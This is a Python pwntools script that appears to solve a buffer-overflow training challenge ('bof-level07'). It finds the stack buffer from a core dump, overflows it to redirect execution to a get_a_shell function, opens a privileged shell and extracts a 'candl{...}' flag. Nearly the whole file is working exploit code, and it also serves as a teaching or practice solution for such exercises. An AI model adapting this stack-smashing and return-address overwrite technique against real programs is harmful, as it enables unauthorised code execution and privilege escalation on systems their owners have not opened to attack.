# SETUP BOILERPLATE
from pwn import *
import os

DEBUG = True # toggles gdb.debug or process
elf = ELF('./bof-level07') # replace this with the actual level
get_a_shell = p32(elf.symbols["get_a_shell"])

# crash the process to get a core file and find the buffer address (still boilerplate)

io = elf.process(env={}, setuid=False)
io.sendline(cyclic(10000)) # send 1000 junk characters
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) # delete the file now that we're done with it

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = elf.debug(env={}, gdbscript='''
    b receive_input
    continue
    ''')
else:
    io = elf.process(env={})


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

print(buffer_address)
max_len = 0x141

our_stack =  b"A" * 4 + get_a_shell
our_stack_len = 0x8 
our_stack_addr = p32(buffer_address + max_len - our_stack_len)

payload = (b"A" * (max_len - our_stack_len - 1)) + our_stack + b"A"
io.sendline(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
